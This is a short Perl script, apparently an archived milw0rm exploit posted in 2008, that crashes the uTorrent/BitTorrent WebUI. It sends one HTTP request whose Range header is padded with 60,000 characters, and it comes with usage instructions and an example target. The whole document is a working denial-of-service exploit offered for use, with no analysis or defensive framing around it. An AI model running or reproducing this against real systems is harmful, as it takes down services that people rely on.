@@ -1,0 +1,41 @@
+#!/usr/bin/perl
+# uTorrent / BitTorrent  WebIU HTTP 1.7.7/6.0.1 Range header Denial of Service exploit
+# according to the following advisory: http://secunia.com/advisories/30605
+#
+# usage: WebUI-dos.pl <url> <port> <user:pass>
+# Exploit written by Exodus.
+# http://www.blackhat.org.il
+
+use IO::Socket;
+use MIME::Base64;
+
+if(@ARGV < 3)
+{ &usage; }
+
+($host,$ref) = split(/\//,$ARGV[0]);
+
+$sock = IO::Socket::INET->new(PeerAddr => "$host:$ARGV[1]", Proto =>'TCP') || die("[X]Couldnt connect to host: $host:$ARGV[1]\n");
+$buff = "E" x 60000;
+$up = encode_base64($ARGV[2]);
+chomp($up);
+
+print $sock "GET /gui/common.js HTTP/1.1\r\n".
+"Host: $host\r\n".
+"Authorization: Basic $up\r\n".
+"Range: bytes=$buff\r\n".
+"Connection: close\r\n\r\n";
+
+close($sock);
+
+print "[!]Payload sent, WebUI should be down...\n";
+
+
+
+sub usage
+{
+	print "usage $0 <url> <port> <user:pass>\n".
+		  "ex: $0 127.0.0.1/gui/common.js 1337 admin:admin\n";
+	exit;
+}
+
+# milw0rm.com [2008-06-23]
